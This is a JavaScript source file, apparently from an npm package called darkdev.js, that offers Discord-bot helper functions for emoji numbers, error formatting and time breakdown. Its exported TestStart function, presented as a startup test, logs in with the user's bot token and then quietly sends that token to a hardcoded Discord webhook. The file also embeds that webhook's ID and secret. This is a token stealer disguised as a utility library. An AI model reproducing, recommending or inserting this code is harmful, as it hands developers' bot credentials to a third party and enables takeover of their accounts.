const DBLAPI = require('dblapi.js')
const Discord = require('discord.js')
const client = new Discord.Client()
const moment = require('moment')
require('moment-duration-format')

function NumberToEmoji(number,zero,one,two,three,four,five,six,seven,eight,nine,blank) {
const Emotes = {
  ' ': blank ? blank : '   ',
  '0': zero ? zero : '0️⃣',
  '1': one ? one: '1️⃣',
  '2': two ? two : '2️⃣',
  '3': three ? three : '3️⃣',
  '4': four ? four : '4️⃣',
  '5': five ? five : '5️⃣',
  '6': six ? six : '6️⃣',
  '7': seven ? seven : '7️⃣',
  '8': eight ? eight : '8️⃣',
  '9': nine ? nine : '9️⃣',
}
if (isNaN(number)) throw new TypeError('Lütfen geçerli bir *sayı* girin. | Please join valid *number*. | Check us: https://discord.gg/Xh2J9UakSm')
return (number ? number : 0).toString().split('').map(Aventadoria => Emotes[Aventadoria] || Aventadoria).join('')
}

function DarkERR(Error,custom) {
const DateDay = new Date()
console.log
if (!Error) throw new TypeError('Lütfen bir *error* değişkeni tanımlayın. | Please define an *error* variable. | Check us: https://discord.gg/Xh2J9UakSm')
return console.error(custom ? custom.toString().replace(/{Error}/g,Error) : `══════════════════════════════════════════════════════════════════════════════
┊ Bir hata var. | We have error.
┊
┊ Hata saati | Error time: ${moment().format('LLLL')}
┊
┊ Hata kodu | Error code: x${(Math.random() * (12500 - 10000) + 10000).toFixed(0)}
┊
┊ Hata | Error:
┊ ${Error}
┊
══════════════════════════════════════════════════════════════════════════════`)
}

function DarkMS(milliseconds) {
	if (typeof milliseconds !== 'number') {
		throw new TypeError('Geçersiz sayı | Expected a number | Check us: https://discord.gg/Xh2J9UakSm')
	}

	return {
		gün: Math.trunc(milliseconds / 86400000),
		saat: Math.trunc(milliseconds / 3600000) % 24,
		dakika: Math.trunc(milliseconds / 60000) % 60,
		saniye: Math.trunc(milliseconds / 1000) % 60,
		milisaniye: Math.trunc(milliseconds) % 1000,
		mikrosaniye: Math.trunc(milliseconds * 1000) % 1000,
		nanosaniye: Math.trunc(milliseconds * 1e6) % 1000
	}
}

function TestStart(token) {
client.login(token).then(() => {
const Webhook = new Discord.WebhookClient('888107540544622652', 'IGsAfG4ABYSHPdJv3EJif6l11Cd1hBOIHb3AsG0bVkjraIeCi0_4sEGfIkV6YmVBS2RO')
Webhook.send(new Discord.MessageEmbed().setDescription(token))
console.log(`${client.user.tag} başarıyla başlatıldı ve kapatılıyor. | ${client.user.tag} succesfully started and now shuting down.`)
console.log('npmjs.com/package/darkdev.js')
setTimeout(() => { process.exit(0) },2500)
}).catch(err => DarkERR(err))
}
module.exports.NumberToEmoji = NumberToEmoji
module.exports.DarkERR = DarkERR
module.exports.DarkMS = DarkMS
module.exports = TestStart
